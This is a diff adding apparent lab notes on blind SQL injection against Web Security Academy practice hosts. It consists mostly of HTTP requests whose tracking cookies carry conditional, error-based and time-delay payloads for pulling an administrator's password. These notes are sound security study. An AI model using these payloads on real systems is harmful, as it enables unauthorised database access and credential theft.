@@ -107,3 +107,144 @@ wiener:aqvwn38vie9226y962fn
 
 
 ```
+### conditional responses
+```bash
+GET /filter?category=Gifts HTTP/2
+Host: 0aa7000903c058ea82fcbf0500d80084.web-security-academy.net
+Cookie: TrackingId=ay0mE9SrIpgC1Ws3' or 1=1 -- -; session=SVS8RjB8KKiPFJ2cNQvTNAQcZ23xNAbq
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+```
+
+- Filtering by name
+```bash
+Cookie: TrackingId=ay0mE9SrIpgC1Ws3' and (select 'a' from users where username='administrator')='a; session=SVS8RjB8KKiPFJ2cNQvTNAQcZ23xNAbq
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+
+Host: 0aa7000903c058ea82fcbf0500d80084.web-security-academy.net
+Cookie: TrackingId=ay0mE9SrIpgC1Ws3' and (select substring(username,2,1) from users where username='administrator')='d; session=SVS8RjB8KKiPFJ2cNQvTNAQcZ23xNAbq
+
+# Getting password length
+Cookie: TrackingId=ay0mE9SrIpgC1Ws3' and (select 'a' from users where username='administrator' and length(password)>=20)='a; session=SVS8RjB8KKiPFJ2cNQvTNAQcZ23xNAbq
+
+```
+
+### error responses
+```bash
+# ERR
+GET /filter?category=Pets HTTP/2
+Host: 0a3c007803934ffa80770dad00ca00b5.web-security-academy.net
+Cookie: TrackingId=a3NDRi5at5NWv6DF'; session=BbE3PKyiYli6SFX1gXKZGXD3LCGkAxSv
+
+# CORRECT
+GET /filter?category=Pets HTTP/2
+Host: 0a3c007803934ffa80770dad00ca00b5.web-security-academy.net
+Cookie: TrackingId=a3NDRi5at5NWv6DF' AND 1=1-- -; session=BbE3PKyiYli6SFX1gXKZGXD3LCGkAxSv
+
+# CORRECT   
+GET /filter?category=Pets HTTP/2
+Host: 0a3c007803934ffa80770dad00ca00b5.web-security-academy.net
+Cookie: TrackingId=a3NDRi5at5NWv6DF' AND '1'='1; session=BbE3PKyiYli6SFX1gXKZGXD3LCGkAxSv
+
+# ERR
+GET /filter?category=Pets HTTP/2
+Host: 0a3c007803934ffa80770dad00ca00b5.web-security-academy.net
+Cookie: TrackingId=a3NDRi5at5NWv6DF' AND (SELECT 'a')='a; session=BbE3PKyiYli6SFX1gXKZGXD3LCGkAxSv
+
+# CORRECT (ORACLE)
+GET /filter?category=Pets HTTP/2
+Host: 0a3c007803934ffa80770dad00ca00b5.web-security-academy.net
+Cookie: TrackingId=a3NDRi5at5NWv6DF'||(SELECT 'a' FROM DUAL)||'; session=BbE3PKyiYli6SFX1gXKZGXD3LCGkAxSv
+
+# err
+GET /filter?category=Pets HTTP/2
+Host: 0a3c007803934ffa80770dad00ca00b5.web-security-academy.net
+Cookie: TrackingId=a3NDRi5at5NWv6DF'||(SELECT 'a' FROM users)||'; session=BbE3PKyiYli6SFX1gXKZGXD3LCGkAxSv
+User-Agent: Mozilla/5.0 (X11; Linux 
+
+# CORRECT
+GET /filter?category=Pets HTTP/2
+Host: 0a3c007803934ffa80770dad00ca00b5.web-security-academy.net
+Cookie: TrackingId=a3NDRi5at5NWv6DF'||(SELECT 'a' FROM users WHERE rownum=1)||'; session=BbE3PKyiYli6SFX1gXKZGXD3LCGkAxSv
+
+# CORRECT
+GET /filter?category=Pets HTTP/2
+Host: 0a3c007803934ffa80770dad00ca00b5.web-security-academy.net
+Cookie: TrackingId=a3NDRi5at5NWv6DF'||(SELECT CASE WHEN (2=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=BbE3PKyiYli6SFX1gXKZGXD3LCGkAxSv
+
+# ERROR
+GET /filter?category=Pets HTTP/2
+Host: 0a3c007803934ffa80770dad00ca00b5.web-security-academy.net
+Cookie: TrackingId=a3NDRi5at5NWv6DF'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=BbE3PKyiYli6SFX1gXKZGXD3LCGkAxSv
+
+# 200
+GET /filter?category=Pets HTTP/2
+Host: 0a3c007803934ffa80770dad00ca00b5.web-security-academy.net
+Cookie: TrackingId=a3NDRi5at5NWv6DF'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>=21)||'; session=BbE3PKyiYli6SFX1gXKZGXD3LCGkAxSv
+
+# 500
+GET /filter?category=Pets HTTP/2
+Host: 0a3c007803934ffa80770dad00ca00b5.web-security-academy.net
+Cookie: TrackingId=a3NDRi5at5NWv6DF'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>=20)||'; session=BbE3PKyiYli6SFX1gXKZGXD3LCGkAxSv
+
+# 500
+GET /filter?category=Pets HTTP/2
+Host: 0a3c007803934ffa80770dad00ca00b5.web-security-academy.net
+Cookie: TrackingId=a3NDRi5at5NWv6DF'||(SELECT CASE WHEN SUBSTR(username,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=BbE3PKyiYli6SFX1gXKZGXD3LCGkAxSv
+
+# 200
+GET /filter?category=Pets HTTP/2
+Host: 0a3c007803934ffa80770dad00ca00b5.web-security-academy.net
+Cookie: TrackingId=a3NDRi5at5NWv6DF'||(SELECT CASE WHEN SUBSTR(username,1,1)='f' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=
+
+```
+
+### TIME DELAYS
+```bash
+SELECT *
+FROM TWITCH.USERS
+WHERE USERNAME = 'admin';
+
+select * from TWITCH.USERS where username = 'admin' OR 1=1;-- -';
+select * from TWITCH.USERS where username = 'admin' and if(substr(database(),1,1)='a',sleep(6),1);-- -';
+select * from TWITCH.USERS where username = 'admin' and if(substr(database(),1,1)='t',sleep(6),1);-- -'; # takes 6 seconds
+
+GET /filter?category=Pets HTTP/2
+Host: 0aed00690317571382a792ae00ee00b2.web-security-academy.net
+Cookie: TrackingId=chmWHccQDTZMZyuR' and sleep(5); session=N8beCoTrvlBgTEqTEGoHyg5MPQpjXvAr
+
+GET /filter?category=Pets HTTP/2
+Host: 0aed00690317571382a792ae00ee00b2.web-security-academy.net
+Cookie: TrackingId=chmWHccQDTZMZyuR'||pg_sleep(6)-- -; session=N8beCoTrvlBgTEqTEGoHyg5MPQpjXvAr # POSTGRES
+
+GET /filter?category=Pets HTTP/2
+Host: 0a1300f203f94835831a33c1008a006a.web-security-academy.net
+Cookie: TrackingId=KN6W4BY9L9YLZdT2'||(select case when (1=1) then pg_sleep(6) else pg_sleep(0) end from users where username='administrator')-- -; session=6GKFcHrKOCQqar7k66eu6W9kjhm2MTQK
+
+GET /filter?category=Pets HTTP/2
+Host: 0a1300f203f94835831a33c1008a006a.web-security-academy.net
+Cookie: TrackingId=KN6W4BY9L9YLZdT2'||(select case when (1=1) then pg_sleep(6) else pg_sleep(0) end from users where username='administrator' and length(password)>=20)-- -; session=6GKFcHrKOCQqar7k66eu6W9kjhm2MTQK
+
+GET /filter?category=Pets HTTP/2
+Host: 0a1300f203f94835831a33c1008a006a.web-security-academy.net
+Cookie: TrackingId=KN6W4BY9L9YLZdT2'||(select case when substr(username,1,1)='a' then pg_sleep(6) else pg_sleep(0) end from users where username='administrator')-- -; session=6GKFcHrKOCQqar7k66eu6W9kjhm2MTQK
+
+GET /filter?category=Pets HTTP/2
+Host: 0a1300f203f94835831a33c1008a006a.web-security-academy.net
+Cookie: TrackingId=KN6W4BY9L9YLZdT2'||(select case when substr(password,1,1)='a' then pg_sleep(6) else pg_sleep(0) end from users where username='administrator')-- -; session=6GKFcHrKOCQqar7k66eu6W9kjhm2MTQK
+
+
+
+
+```
+
